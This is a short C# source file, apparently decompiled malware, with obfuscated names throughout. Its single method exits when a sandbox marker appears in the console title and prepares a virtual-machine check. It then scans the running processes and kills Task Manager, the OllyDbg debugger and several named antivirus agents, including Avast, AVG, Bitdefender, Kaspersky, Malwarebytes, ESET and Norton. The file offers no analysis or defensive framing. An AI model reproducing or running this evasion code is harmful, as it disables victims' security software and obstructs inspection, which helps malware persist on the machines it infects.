using System;
using System.Diagnostics;
using System.Runtime.CompilerServices;

namespace GMTXgkoxMKfPPprguAuZBnWkDLqvmFFkZNsttlj;

public class jGToYxriwsvbDfHvkaYVQSoEQUBJVQLbPgCdM
{
	private static string taskmgr = "taskmgr";

	private static string ashWebSv = "ashWebSv";

	private static string avgemc = "avgemc";

	private static string bdagent = "bdagent";

	private static string cpf = "cpf";

	private static string avp = "avp";

	private static string mbam = "mbam";

	private static string egui = "egui";

	private static string ollydbg = "ollydbg";

	private static string ccapp = "ccapp";

	private static string VMstr = "SELECT * FROM Win32_VideoController";

	private static string SBstr = "#";

	public static void vqSToFbakxBgBLalqAIFENGZC()
	{
		if (Console.Title.Contains(SBstr))
		{
			Environment.Exit(1);
		}
		_ = Environment.UserName;
		string vMstr = VMstr;
		object[] array = new object[1] { vMstr };
		bool[] array2 = new bool[1] { true };
		if (array2[0])
		{
			vMstr = Convert.ToString(Convert.ChangeType(RuntimeHelpers.GetObjectValue(array[0]), typeof(string)));
		}
		Process[] processes = Process.GetProcesses();
		for (int i = 0; i < processes.Length - 1; i++)
		{
			if (processes[i].ProcessName.ToLower().Contains(taskmgr))
			{
				processes[i].Kill();
			}
			if (processes[i].ProcessName.ToLower().Contains(ashWebSv))
			{
				processes[i].Kill();
			}
			if (processes[i].ProcessName.ToLower().Contains(avgemc))
			{
				processes[i].Kill();
			}
			if (processes[i].ProcessName.ToLower().Contains(bdagent))
			{
				processes[i].Kill();
			}
			if (processes[i].ProcessName.ToLower().Contains(cpf))
			{
				processes[i].Kill();
			}
			if (processes[i].ProcessName.ToLower().Contains(avp))
			{
				processes[i].Kill();
			}
			if (processes[i].ProcessName.ToLower().Contains(mbam))
			{
				processes[i].Kill();
			}
			if (processes[i].ProcessName.ToLower().Contains(egui))
			{
				processes[i].Kill();
			}
			if (processes[i].ProcessName.ToLower().Contains(ccapp))
			{
				processes[i].Kill();
			}
			if (processes[i].ProcessName.ToLower().Contains(ollydbg))
			{
				processes[i].Kill();
			}
		}
	}
}
